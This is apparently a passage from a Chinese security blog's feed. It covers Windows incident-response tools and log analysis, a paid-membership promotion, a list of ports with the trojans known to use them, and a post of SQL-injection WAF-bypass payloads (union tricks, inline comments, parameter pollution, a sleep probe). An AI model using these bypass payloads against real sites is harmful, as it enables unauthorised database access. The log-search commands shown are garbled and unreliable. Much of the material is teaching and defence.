hook、patches检测和恢复11.文件系统查看，支持基本的文件操作12.查看（编辑）IE插件、SPI、启动项、服务、Host文件、映像劫持、文件关联、系统防火墙规则、IME13.ObjectType Hook检测和恢复14.DPC定时器检测和删除15.MBR Rootkit检测和修复16.内核对象劫持检测17.WorkerThread枚举18.Ndis中一些回调信息枚举19.硬件调试寄存器、调试相关API检测20.枚举SFilter/Fltmgr的回调</code></pre><p>最简单的使用方法，根据颜色去辨识——可疑进程，隐藏服务、被挂钩函数：红色，然后根据程序右键功能去定位具体的程序和移除功能。根据可疑的进程名等进行互联网信息检索然后统一清除并关联注册表。</p><h5 id="webshell扫描"><a href="#webshell扫描" class="headerlink" title="webshell扫描"></a>webshell扫描</h5><p>可使用<code>D</code>盾，安全狗，河马等。</p><h4 id="11-日志分析"><a href="#11-日志分析" class="headerlink" title="11. 日志分析"></a>11. 日志分析</h4><p>1、打开事件管理器（开始—管理工具—事件查看/开始运行<code>eventvwr</code>）<br>2、主要分析安全日志，可以借助自带的筛选功能<br>3、这里我使用的是<code>EmEditor</code></p><p><img src="http://static.zybuluo.com/1kbfree/3f62487ux9zlsfcte8ruao6f/image_1db11l8nicck1i6m1ncn1e1119si13.png" alt="image_1db11l8nicck1i6m1ncn1e1119si13.png-340.1kB"></p><h4 id="12-相关处置"><a href="#12-相关处置" class="headerlink" title="12. 相关处置"></a>12. 相关处置</h4><p>通过网络连接锁定的可疑进程，进行定位恶意程序后删除(<code>taskkill</code>)</p><p>木马查杀，可配合 <code>pchunter</code> 进行进一步专业分析，使用工具功能进行强制停止以及删除</p><p>最后清理后，统一查看网络连接、进程、内核钩子等是否正常</p><h4 id="13-应用类"><a href="#13-应用类" class="headerlink" title="13. 应用类"></a>13. 应用类</h4><pre><code>Apache、tomcat、Nginx、IIS</code></pre><p>无论任何<code>web</code>服务器其实日志需要关注的东西是一致的，即access_log和error_log。一般在确定ip地址后，通过:</p><pre><code>find . access_log |grep xargs ip攻击地址find . access_log| grep xargs 木马文件名</code></pre><p>在对<code>WEB</code>日志进行安全分析时，可以按照下面两种思路展开，逐步深入，还原整个攻击过程。</p><p>1、首先确定受到攻击、入侵的<strong>时间</strong>范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。</p><p><img src="http://static.zybuluo.com/1kbfree/xmwb2pc3msu7sauufw78ip1o/image_1db11udv31n9a325o3vcvh16471g.png" alt="image_1db11udv31n9a325o3vcvh16471g.png-88.6kB"></p><p>2、一般攻击者在入侵网站后，通常会上传一个后门文件，以方便自己以后访问。我们也可以以该文件为线索来展开分析。</p><p><img src="http://static.zybuluo.com/1kbfree/qv4wcy9m7j2qaeda0i6cbwbe/image_1db11v3mvp79ko81u9i761pbs1t.png" alt="image_1db11v3mvp79ko81u9i761pbs1t.png-100.9kB"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的小密圈</title>
      <link href="/2019/01/18/wo-de-xiao-mi-quan/"/>
      <url>/2019/01/18/wo-de-xiao-mi-quan/</url>
      
        <content type="html"><![CDATA[<h2 id="小密圈介绍"><a href="#小密圈介绍" class="headerlink" title="小密圈介绍"></a>小密圈介绍</h2><p>小密圈主要的是分享<code>Web</code>安全（漏洞挖掘，代码审计），渗透测试（<code>getshell</code>分析，新爆漏洞分析等），还有一些其他有趣的东西，价格暂时为<code>111</code>（其实价格不算贵，毕竟知识是无价的，而且我在拿这些入圈费进行一些秘密活动~~ 总之收益大家的）</p><p><img src="http://static.zybuluo.com/1kbfree/yl7zhfxyuwytt2gmlqu4paec/1.png" alt="1.png-39.5kB"></p><p>如果觉得贵的话我觉得没必要来的~ 毕竟不愿意为自己投资 毫无办法~</p><p>小密圈价格会越来越高，支持我的表哥们早点来呀~</p><p><img src="http://static.zybuluo.com/1kbfree/0csop73ilzhup0sc7sp11vlc/image_1d1ek93iuappavn1g3jtff10ghl.png" alt="image_1d1ek93iuappavn1g3jtff10ghl.png-110.2kB"></p><p><img src="http://static.zybuluo.com/1kbfree/d4qcz2bzvke9en674fjtl2gw/image_1d1ek9flb4ou1ngg5kgjno1h6412.png" alt="image_1d1ek9flb4ou1ngg5kgjno1h6412.png-155.8kB"></p><p><img src="http://static.zybuluo.com/1kbfree/hni03rrfsyw5rxg3pp3ucka2/image_1d1eka002lhf2mfll8bp814bk1f.png" alt="image_1d1eka002lhf2mfll8bp814bk1f.png-136.9kB"></p><p><img src="http://static.zybuluo.com/1kbfree/qdvci0iybhkqleqkqzh0eejx/image_1d1ekagg7119jk0d61r18av17f91s.pn" alt="image_1d1ekagg7119jk0d61r18av17f91s.png-147.2kB"></p><p>还有很多~~ 总之干活多多呢！！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> 小密圈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入绕过总结[持续更新]</title>
      <link href="/2019/01/16/sql-zhu-ru-rao-guo-zong-jie-chi-xu-geng-xin/"/>
      <url>/2019/01/16/sql-zhu-ru-rao-guo-zong-jie-chi-xu-geng-xin/</url>
      
        <content type="html"><![CDATA[<h2 id="MSSQL数据库特性"><a href="#MSSQL数据库特性" class="headerlink" title="MSSQL数据库特性"></a>MSSQL数据库特性</h2><ul><li>注释绕过：<ul><li><code>MSSQL</code>也可以使用<code>/**/</code>注释</li></ul></li><li>浮点数：<ul><li><code>select * from user where id=1.1union select 1,&#39;2&#39;,db_name() from user</code></li></ul></li><li><code>1EO</code>形式<ul><li><code>select * from user where id=1e0union select 1,&#39;2&#39;,db_name() from user</code></li></ul></li></ul><p>如执行</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">.</span>eunion <span class="token keyword">select</span> xxxxxxx</code></pre><p>等同于</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> xxxxxxx</code></pre><p>但是这样可以绕过对<code>union select</code>的防御</p><h3 id="HPP特性"><a href="#HPP特性" class="headerlink" title="HPP特性"></a><code>HPP</code>特性</h3><p><code>ASPX+IIS</code>搭配的时候同时提交参数<code>id</code>，会接收所有的参数，通过逗号分割，比如在<code>cookie、post、get</code>里都传入<code>id=1</code>，那么最终的结果会是<code>1,1,1</code></p><p>再比如这个<code>url:http://www.a.com/index.php?id=1</code>存在<code>sql</code>注入，那么可与这样子</p><p><strong><code>get</code>请求中传入如下参数</strong></p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//www.a.com/index.php?id=1.eunion/**/select null,null,name/*</span></code></pre><p><strong>然后在<code>post</code>请求中传入如下参数</strong></p><pre class=" language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">*</span><span class="token operator">/</span><span class="token keyword">from</span> xxxxxxx</code></pre><p>最终的输出结果就会变成这个样子</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token number">1</span><span class="token punctuation">.</span>eunion<span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>name<span class="token comment" spellcheck="true">/*,*/</span><span class="token keyword">from</span> xxxxxxx</code></pre><h2 id="MYSQL特性"><a href="#MYSQL特性" class="headerlink" title="MYSQL特性"></a>MYSQL特性</h2><h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><pre class=" language-sql"><code class="language-sql">内联注释：<span class="token comment" spellcheck="true">/*!12345union*/</span><span class="token keyword">select</span></code></pre><p><img src="http://static.zybuluo.com/1kbfree/693xs0jeiif90en5l30jnzm6/1.png" alt="1.png-8kB"></p><p>如下方法可以快速的检测某处是否存在<code>sql</code>注入漏洞</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//www.xxx.com/index.php?id=1/*!12345union*/select/*!union12345sleep(5)*/;</span></code></pre><h3 id="x-xxxx"><a href="#x-xxxx" class="headerlink" title="{x xxxx}"></a><code>{x xxxx}</code></h3><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> {x <span class="token keyword">user</span>}</code></pre><p>结果和这样一样</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span></code></pre><p><img src="http://static.zybuluo.com/1kbfree/nuoptfjsz071utup5dp5nhfe/1.png" alt="1.png-8.9kB"></p><h3 id="E0"><a href="#E0" class="headerlink" title="E0"></a><code>E0</code></h3><pre><code>E0在mysql里是效果等于空格</code></pre><p><img src="http://static.zybuluo.com/1kbfree/tnz7xiw06zro2d1vm34m66pt/1.png" alt="1.png-18.6kB"></p><h3 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h3><p><img src="http://static.zybuluo.com/1kbfree/oxyz6iqpo51n1bmvxf6pwfpv/1.png" alt="1.png-16kB"></p><pre class=" language-sql"><code class="language-sql"><span class="token punctuation">.</span>1union <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxxxx</code></pre><p>然后就会变成</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxxx <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">.</span>1union <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxxxx</code></pre><p>这样子的话<code>id</code>就是不存在然后就会执行后面的<code>SQL</code>语句</p><h3 id="一些POC"><a href="#一些POC" class="headerlink" title="一些POC"></a>一些<code>POC</code></h3><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>、<span class="token comment" spellcheck="true">/*!12345select*/</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span><span class="token number">2</span>、<span class="token comment" spellcheck="true">/*!50001select*/</span><span class="token keyword">from</span><span class="token number">3</span>、<span class="token keyword">Select</span><span class="token comment" spellcheck="true">/**/</span>column_name<span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span><span class="token number">4</span>、<span class="token comment" spellcheck="true">/*!/*!select*/</span>column_name<span class="token comment" spellcheck="true">/*!/*!from*/</span><span class="token number">5</span>、空格用<span class="token comment" spellcheck="true">/*!*/</span>代替<span class="token number">6</span>、<span class="token operator">%</span>53elect<span class="token operator">/</span><span class="token operator">*</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>schema_name<span class="token operator">%</span>0aFROM<span class="token number">7</span>、Get<span class="token operator">+</span>Post，编码，超长内容等等。</code></pre>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>端口信息总结</title>
      <link href="/2019/01/14/duan-kou-xin-xi-zong-jie/"/>
      <url>/2019/01/14/duan-kou-xin-xi-zong-jie/</url>
      
        <content type="html"><![CDATA[<h3 id="端口：0"><a href="#端口：0" class="headerlink" title="端口：0"></a>端口：0</h3><p>服务：Reserved<br>说明：通常用于分析操作系统。这一方法能够工作是因为在一些系统中“0”是无效端口，当你试图使用通常的闭合端口连接它时将产生不同的结果。一种典型的扫描，使用IP地址为0.0.0.0，设置ACK位并在以太网层广播。 </p><h3 id="端口：1"><a href="#端口：1" class="headerlink" title="端口：1"></a>端口：1</h3><p>服务：tcpmux<br>说明：这显示有人在寻找SGI<br>Irix机器。Irix是实现tcpmux的主要提供者，默认情况下tcpmux在这种系统中被打开。Irix机器在发布是含有几个默认的无密码的帐户，如：IP、GUEST<br>UUCP、NUUCP、DEMOS<br>、TUTOR、DIAG、OUTOFBOX等。许多管理员在安装后忘记删除这些帐户。因此HACKER在INTERNET上搜索tcpmux并利用这些帐户。</p><h3 id="端口：7"><a href="#端口：7" class="headerlink" title="端口：7"></a>端口：7</h3><p>服务：Echo<br>说明：能看到许多人搜索Fraggle放大器时，发送到X.X.X.0和X.X.X.255的信息。 </p><h3 id="端口：19"><a href="#端口：19" class="headerlink" title="端口：19"></a>端口：19</h3><p>服务：Character<br>Generator<br>说明：这是一种仅仅发送字符的服务。UDP版本将会在收到UDP包后回应含有垃圾字符的包。TCP连接时会发送含有垃圾字符的数据流直到连接关闭。HACKER利用IP欺骗可以发动DoS攻击。伪造两个chargen服务器之间的UDP包。同样Fraggle<br>DoS攻击向目标地址的这个端口广播一个带有伪造受害者IP的数据包，受害者为了回应这些数据而过载。</p><h3 id="端口：21"><a href="#端口：21" class="headerlink" title="端口：21"></a>端口：21</h3><p>服务：FTP<br>说明：FTP服务器所开放的端口，用于上传、下载。最常见的攻击者用于寻找打开anonymous的FTP服务器的方法。这些服务器带有可读写的目录。木马Doly<br>Trojan、Fore、Invisible FTP、WebEx、WinCrash和Blade<br>Runner所开放的端口。</p><h3 id="端口：22"><a href="#端口：22" class="headerlink" title="端口：22"></a>端口：22</h3><p>服务：Ssh<br>说明：PcAnywhere建立的TCP和这一端口的连接可能是为了寻找ssh。这一服务有许多弱点，如果配置成特定的模式，许多使用RSAREF库的版本就会有不少的漏洞存在。</p><h3 id="端口：23"><a href="#端口：23" class="headerlink" title="端口：23"></a>端口：23</h3><p>服务：Telnet<br>说明：远程登录，入侵者在搜索远程登录UNIX的服务。大多数情况下扫描这一端口是为了找到机器运行的操作系统。还有使用其他技术，入侵者也会找到密码。木马Tiny<br>Telnet<br>Server就开放这个端口。</p><h3 id="端口：25"><a href="#端口：25" class="headerlink" title="端口：25"></a>端口：25</h3><p>服务：SMTP<br>说明：SMTP服务器所开放的端口，用于发送邮件。入侵者寻找SMTP服务器是为了传递他们的SPAM。入侵者的帐户被关闭，他们需要连接到高带宽的E-MAIL服务器上，将简单的信息传递到不同的地址。木马Antigen、Email<br>Password Sender、Haebu Coceda、Shtrilitz<br>Stealth、WinPC、WinSpy都开放这个端口。</p><h3 id="端口：31"><a href="#端口：31" class="headerlink" title="端口：31"></a>端口：31</h3><p>服务：MSG<br>Authentication<br>说明：木马Master Paradise、Hackers<br>Paradise开放此端口。</p><h3 id="端口：42"><a href="#端口：42" class="headerlink" title="端口：42"></a>端口：42</h3><p>服务：WINS<br>Replication<br>说明：WINS复制</p><h3 id="端口：53"><a href="#端口：53" class="headerlink" title="端口：53"></a>端口：53</h3><p>服务：Domain Name<br>Server（DNS）<br>说明：DNS服务器所开放的端口，入侵者可能是试图进行区域传递（TCP），欺骗DNS（UDP）或隐藏其他的通信。因此防火墙常常过滤或记录此端口。</p><h3 id="端口：67"><a href="#端口：67" class="headerlink" title="端口：67"></a>端口：67</h3><p>服务：Bootstrap<br>Protocol Server<br>说明：通过DSL和Cable<br>modem的防火墙常会看见大量发送到广播地址255.255.255.255的数据。这些机器在向DHCP服务器请求一个地址。HACKER常进入它们，分配一个地址把自己作为局部路由器而发起大量中间人（man-in-middle）攻击。客户端向68端口广播请求配置，服务器向67端口广播回应请求。这种回应使用广播是因为客户端还不知道可以发送的IP地址。<br>DHCP (UDP ports 67 and 68)</p><h3 id="端口：69"><a href="#端口：69" class="headerlink" title="端口：69"></a>端口：69</h3><p>服务：Trival<br>File<br>Transfer<br>说明：许多服务器与bootp一起提供这项服务，便于从系统下载启动代码。但是它们常常由于错误配置而使入侵者能从系统中窃取任何文件。它们也可用于系统写入文件。 </p><h3 id="端口：79"><a href="#端口：79" class="headerlink" title="端口：79"></a>端口：79</h3><p>服务：Finger<br>Server<br>说明：入侵者用于获得用户信息，查询操作系统，探测已知的缓冲区溢出错误，回应从自己机器到其他机器Finger扫描。</p><h3 id="端口：80"><a href="#端口：80" class="headerlink" title="端口：80"></a>端口：80</h3><p>服务：HTTP<br>说明：用于网页浏览。木马Executor开放此端口。</p><h3 id="端口：99"><a href="#端口：99" class="headerlink" title="端口：99"></a>端口：99</h3><p>服务：Metagram<br>Relay<br>说明：后门程序ncx99开放此端口。</p><h3 id="端口：102"><a href="#端口：102" class="headerlink" title="端口：102"></a>端口：102</h3><p>服务：Message transfer<br>agent(MTA)-X.400 over TCP/IP<br>说明：消息传输代理。</p><h3 id="端口：109"><a href="#端口：109" class="headerlink" title="端口：109"></a>端口：109</h3><p>服务：Post Office<br>Protocol<br>-Version3<br>说明：POP3服务器开放此端口，用于接收邮件，客户端访问服务器端的邮件服务。POP3服务有许多公认的弱点。关于用户名和密码交换缓冲区溢出的弱点至少有20个，这意味着入侵者可以在真正登陆前进入系统。成功登陆后还有其他缓冲区溢出错误。</p><h3 id="端口：110"><a href="#端口：110" class="headerlink" title="端口：110"></a>端口：110</h3><p>服务：SUN公司的RPC服务所有端口<br>说明：常见RPC服务有rpc.mountd、NFS、rpc.statd、rpc.csmd、rpc.ttybd、amd等</p><h3 id="端口：113"><a href="#端口：113" class="headerlink" title="端口：113"></a>端口：113</h3><p>服务：Authentication<br>Service<br>说明：这是一个许多计算机上运行的协议，用于鉴别TCP连接的用户。使用标准的这种服务可以获得许多计算机的信息。但是它可作为许多服务的记录器，尤其是FTP、POP、IMAP、SMTP和IRC等服务。通常如果有许多客户通过防火墙访问这些服务，将会看到许多这个端口的连接请求。记住，如果阻断这个端口客户端会感觉到在防火墙另一边与E-MAIL服务器的缓慢连接。许多防火墙支持TCP连接的阻断过程中发回RST。这将会停止缓慢的连接。</p><h3 id="端口：119"><a href="#端口：119" class="headerlink" title="端口：119"></a>端口：119</h3><p>服务：Network<br>News Transfer<br>Protocol<br>说明：NEWS新闻组传输协议，承载USENET通信。这个端口的连接通常是人们在寻找USENET服务器。多数ISP限制，只有他们的客户才能访问他们的新闻组服务器。打开新闻组服务器将允许发/读任何人的帖子，访问被限制的新闻组服务器，匿名发帖或发送SPAM。</p><h3 id="端口：135"><a href="#端口：135" class="headerlink" title="端口：135"></a>端口：135</h3><p>服务：Location<br>Service<br>说明：Microsoft在这个端口运行DCE RPC end-point mapper为它的DCOM服务。这与UNIX<br>111端口的功能很相似。使用DCOM和RPC的服务利用计算机上的end-point<br>mapper注册它们的位置。远端客户连接到计算机时，它们查找end-point<br>mapper找到服务的位置。HACKER扫描计算机的这个端口是为了找到这个计算机上运行Exchange<br>Server吗？什么版本？还有些DOS攻击直接针对这个端口。</p><h3 id="端口：137、138、139"><a href="#端口：137、138、139" class="headerlink" title="端口：137、138、139"></a>端口：137、138、139</h3><p>服务：NETBIOS Name<br>Service<br>说明：其中137、138是UDP端口，当通过网上邻居传输文件时用这个端口。而139端口通过这个端口进入的连接试图获得NetBIOS/SMB服务。这个协议被用于windows文件和打印机共享和SAMBA。还有WINS<br>Regisrtation也用它。 </p><h3 id="端口：143"><a href="#端口：143" class="headerlink" title="端口：143"></a>端口：143</h3><p>服务：Interim Mail Access Protocol<br>v2<br>说明：和POP3的安全问题一样，许多IMAP服务器存在有缓冲区溢出漏洞。记住：一种Linux蠕虫（admv0rm）会通过这个端口繁殖，因此许多这个端口的扫描来自不知情的已经被感染的用户。当REDHAT在他们的LINUX发布版本中默认允许IMAP后，这些漏洞变的很流行。这一端口还被用于IMAP2，但并不流行。</p><h3 id="端口：161"><a href="#端口：161" class="headerlink" title="端口：161"></a>端口：161</h3><p>服务：SNMP<br>说明：SNMP允许远程管理设备。所有配置和运行信息的储存在数据库中，通过SNMP可获得这些信息。许多管理员的错误配置将被暴露在Internet。Cackers将试图使用默认的密码public、private访问系统。他们可能会试验所有可能的组合。SNMP包可能会被错误的指向用户的网络。</p><h3 id="端口：177"><a href="#端口：177" class="headerlink" title="端口：177"></a>端口：177</h3><p>服务：X<br>Display Manager Control<br>Protocol<br>说明：许多入侵者通过它访问X-windows操作台，它同时需要打开6000端口。</p><h3 id="端口：389"><a href="#端口：389" class="headerlink" title="端口：389"></a>端口：389</h3><p>服务：LDAP、ILS<br>说明：轻型目录访问协议和NetMeeting<br>Internet Locator<br>Server共用这一端口。</p><h3 id="端口：443"><a href="#端口：443" class="headerlink" title="端口：443"></a>端口：443</h3><p>服务：Https<br>说明：网页浏览端口，能提供加密和通过安全端口传输的另一种HTTP。</p><h3 id="端口：456"><a href="#端口：456" class="headerlink" title="端口：456"></a>端口：456</h3><p>服务：[NULL]<br>说明：木马HACKERS<br>PARADISE开放此端口。</p><h3 id="端口：513"><a href="#端口：513" class="headerlink" title="端口：513"></a>端口：513</h3><p>服务：Login,remote login<br>说明：是从使用cable<br>modem或DSL登陆到子网中的UNIX计算机发出的广播。这些人为入侵者进入他们的系统提供了信息。</p><h3 id="端口：544"><a href="#端口：544" class="headerlink" title="端口：544"></a>端口：544</h3><p>服务：[NULL]<br>说明：kerberos kshell</p><h3 id="端口：548"><a href="#端口：548" class="headerlink" title="端口：548"></a>端口：548</h3><p>服务：Macintosh,File<br>Services(AFP/IP)<br>说明：Macintosh,文件服务。</p><h3 id="端口：553"><a href="#端口：553" class="headerlink" title="端口：553"></a>端口：553</h3><p>服务：CORBA IIOP<br>（UDP）<br>说明：使用cable<br>modem、DSL或VLAN将会看到这个端口的广播。CORBA是一种面向对象的RPC系统。入侵者可以利用这些信息进入系统。</p><h3 id="端口：555"><a href="#端口：555" class="headerlink" title="端口：555"></a>端口：555</h3><p>服务：DSF<br>说明：木马PhAse1.0、Stealth<br>Spy、IniKiller开放此端口。</p><h3 id="端口：568"><a href="#端口：568" class="headerlink" title="端口：568"></a>端口：568</h3><p>服务：Membership DPA<br>说明：成员资格<br>DPA。</p><h3 id="端口：569"><a href="#端口：569" class="headerlink" title="端口：569"></a>端口：569</h3><p>服务：Membership MSN<br>说明：成员资格<br>MSN。</p><h3 id="端口：635"><a href="#端口：635" class="headerlink" title="端口：635"></a>端口：635</h3><p>服务：mountd<br>说明：Linux的mountd<br>Bug。这是扫描的一个流行BUG。大多数对这个端口的扫描是基于UDP的，但是基于TCP的mountd有所增加（mountd同时运行于两个端口）。记住mountd可运行于任何端口（到底是哪个端口，需要在端口111做portmap查询），只是Linux默认端口是635，就像NFS通常运行于2049端口。</p><h3 id="端口：636"><a href="#端口：636" class="headerlink" title="端口：636"></a>端口：636</h3><p>服务：LDAP<br>说明：SSL（Secure<br>Sockets layer）</p><h3 id="端口：666"><a href="#端口：666" class="headerlink" title="端口：666"></a>端口：666</h3><p>服务：Doom Id Software<br>说明：木马Attack FTP、Satanz<br>Backdoor开放此端口</p><h3 id="端口：993"><a href="#端口：993" class="headerlink" title="端口：993"></a>端口：993</h3><p>服务：IMAP<br>说明：SSL（Secure Sockets<br>layer）</p><h3 id="端口：1001、1011"><a href="#端口：1001、1011" class="headerlink" title="端口：1001、1011"></a>端口：1001、1011</h3><p>服务：[NULL]<br>说明：木马Silencer、WebEx开放1001端口。木马Doly<br>Trojan开放1011端口。</p><h3 id="端口：1024"><a href="#端口：1024" class="headerlink" title="端口：1024"></a>端口：1024</h3><p>服务：Reserved<br>说明：它是动态端口的开始，许多程序并不在乎用哪个端口连接网络，它们请求系统为它们分配下一个闲置端口。基于这一点分配从端口1024开始。这就是说第一个向系统发出请求的会分配到1024端口。你可以重启机器，打开Telnet，再打开一个窗口运行natstat<br>-a 将会看到Telnet被分配1024端口。还有SQL<br>session也用此端口和5000端口。</p><h3 id="端口：1025、1033"><a href="#端口：1025、1033" class="headerlink" title="端口：1025、1033"></a>端口：1025、1033</h3><p>服务：1025：network blackjack<br>1033：[NULL]<br>说明：木马netspy开放这2个端口。</p><h3 id="端口：1080"><a href="#端口：1080" class="headerlink" title="端口：1080"></a>端口：1080</h3><p>服务：SOCKS<br>说明：这一协议以通道方式穿过防火墙，允许防火墙后面的人通过一个IP地址访问INTERNET。理论上它应该只允许内部的通信向外到达INTERNET。但是由于错误的配置，它会允许位于防火墙外部的攻击穿过防火墙。WinGate常会发生这种错误，在加入IRC聊天室时常会看到这种情况。</p><h3 id="端口：1170"><a href="#端口：1170" class="headerlink" title="端口：1170"></a>端口：1170</h3><p>服务：[NULL]<br>说明：木马Streaming<br>Audio Trojan、Psyber Stream<br>Server、Voice开放此端口。</p><h3 id="端口：1234、1243、6711、6776"><a href="#端口：1234、1243、6711、6776" class="headerlink" title="端口：1234、1243、6711、6776"></a>端口：1234、1243、6711、6776</h3><p>服务：[NULL]<br>说明：木马SubSeven2.0、Ultors<br>Trojan开放1234、6776端口。木马SubSeven1.0/1.9开放1243、6711、6776端口。</p><h3 id="端口：1245"><a href="#端口：1245" class="headerlink" title="端口：1245"></a>端口：1245</h3><p>服务：[NULL]<br>说明：木马Vodoo开放此端口。</p><h3 id="端口：1433"><a href="#端口：1433" class="headerlink" title="端口：1433"></a>端口：1433</h3><p>服务：SQL<br>说明：Microsoft的SQL服务开放的端口。</p><h3 id="端口：1492"><a href="#端口：1492" class="headerlink" title="端口：1492"></a>端口：1492</h3><p>服务：stone-design-1<br>说明：木马FTP99CMP开放此端口。</p><h3 id="端口：1500"><a href="#端口：1500" class="headerlink" title="端口：1500"></a>端口：1500</h3><p>服务：RPC<br>client fixed port session<br>queries<br>说明：RPC客户固定端口会话查询</p><h3 id="端口：1503"><a href="#端口：1503" class="headerlink" title="端口：1503"></a>端口：1503</h3><p>服务：NetMeeting<br>T.120<br>说明：NetMeeting<br>T.120</p><h3 id="端口：1524"><a href="#端口：1524" class="headerlink" title="端口：1524"></a>端口：1524</h3><p>服务：ingress<br>说明：许多攻击脚本将安装一个后门SHELL于这个端口，尤其是针对SUN系统中Sendmail和RPC服务漏洞的脚本。如果刚安装了防火墙就看到在这个端口上的连接企图，很可能是上述原因。可以试试Telnet到用户的计算机上的这个端口，看看它是否会给你一个SHELL。连接到600/pcserver也存在这个问题。</p><h3 id="端口：1600"><a href="#端口：1600" class="headerlink" title="端口：1600"></a>端口：1600</h3><p>服务：issd<br>说明：木马Shivka-Burka开放此端口。</p><h3 id="端口：1720"><a href="#端口：1720" class="headerlink" title="端口：1720"></a>端口：1720</h3><p>服务：NetMeeting<br>说明：NetMeeting<br>H.233 call Setup。</p><h3 id="端口：1731"><a href="#端口：1731" class="headerlink" title="端口：1731"></a>端口：1731</h3><p>服务：NetMeeting Audio Call<br>Control<br>说明：NetMeeting音频调用控制。</p><h3 id="端口：1807"><a href="#端口：1807" class="headerlink" title="端口：1807"></a>端口：1807</h3><p>服务：[NULL]<br>说明：木马SpySender开放此端口。</p><h3 id="端口：1981"><a href="#端口：1981" class="headerlink" title="端口：1981"></a>端口：1981</h3><p>服务：[NULL]<br>说明：木马ShockRave开放此端口。</p><h3 id="端口：1999"><a href="#端口：1999" class="headerlink" title="端口：1999"></a>端口：1999</h3><p>服务：cisco<br>identification<br>port<br>说明：木马BackDoor开放此端口。</p><h3 id="端口：2000"><a href="#端口：2000" class="headerlink" title="端口：2000"></a>端口：2000</h3><p>服务：[NULL]<br>说明：木马GirlFriend<br>1.3、Millenium 1.0开放此端口。</p><h3 id="端口：2001"><a href="#端口：2001" class="headerlink" title="端口：2001"></a>端口：2001</h3><p>服务：[NULL]<br>说明：木马Millenium 1.0、Trojan<br>Cow开放此端口。</p><h3 id="端口：2023"><a href="#端口：2023" class="headerlink" title="端口：2023"></a>端口：2023</h3><p>服务：xinuexpansion 4<br>说明：木马Pass<br>Ripper开放此端口。</p><h3 id="端口：2049"><a href="#端口：2049" class="headerlink" title="端口：2049"></a>端口：2049</h3><p>服务：NFS<br>说明：NFS程序常运行于这个端口。通常需要访问Portmapper查询这个服务运行于哪个端口。</p><h3 id="端口：2115"><a href="#端口：2115" class="headerlink" title="端口：2115"></a>端口：2115</h3><p>服务：[NULL]<br>说明：木马Bugs开放此端口。</p><h3 id="端口：2140、3150"><a href="#端口：2140、3150" class="headerlink" title="端口：2140、3150"></a>端口：2140、3150</h3><p>服务：[NULL]<br>说明：木马Deep<br>Throat 1.0/3.0开放此端口。</p><h3 id="端口：2500"><a href="#端口：2500" class="headerlink" title="端口：2500"></a>端口：2500</h3><p>服务：RPC client using a fixed port session<br>replication<br>说明：应用固定端口会话复制的RPC客户</p><h3 id="端口：2583"><a href="#端口：2583" class="headerlink" title="端口：2583"></a>端口：2583</h3><p>服务：[NULL]<br>说明：木马Wincrash<br>2.0开放此端口。</p><h3 id="端口：2801"><a href="#端口：2801" class="headerlink" title="端口：2801"></a>端口：2801</h3><p>服务：[NULL]<br>说明：木马Phineas<br>Phucker开放此端口。</p><h3 id="端口：3024、4092"><a href="#端口：3024、4092" class="headerlink" title="端口：3024、4092"></a>端口：3024、4092</h3><p>服务：[NULL]<br>说明：木马WinCrash开放此端口。</p><h3 id="端口：3128"><a href="#端口：3128" class="headerlink" title="端口：3128"></a>端口：3128</h3><p>服务：squid<br>说明：这是squid<br>HTTP代理服务器的默认端口。攻击者扫描这个端口是为了搜寻一个代理服务器而匿名访问Internet。也会看到搜索其他代理服务器的端口8000、8001、8080、8888。扫描这个端口的另一个原因是用户正在进入聊天室。其他用户也会检验这个端口以确定用户的机器是否支持代理。</p><h3 id="端口：3129"><a href="#端口：3129" class="headerlink" title="端口：3129"></a>端口：3129</h3><p>服务：[NULL]<br>说明：木马Master<br>Paradise开放此端口。</p><h3 id="端口：3150"><a href="#端口：3150" class="headerlink" title="端口：3150"></a>端口：3150</h3><p>服务：[NULL]<br>说明：木马The<br>Invasor开放此端口。</p><h3 id="端口：3210、4321"><a href="#端口：3210、4321" class="headerlink" title="端口：3210、4321"></a>端口：3210、4321</h3><p>服务：[NULL]<br>说明：木马SchoolBus开放此端口</p><h3 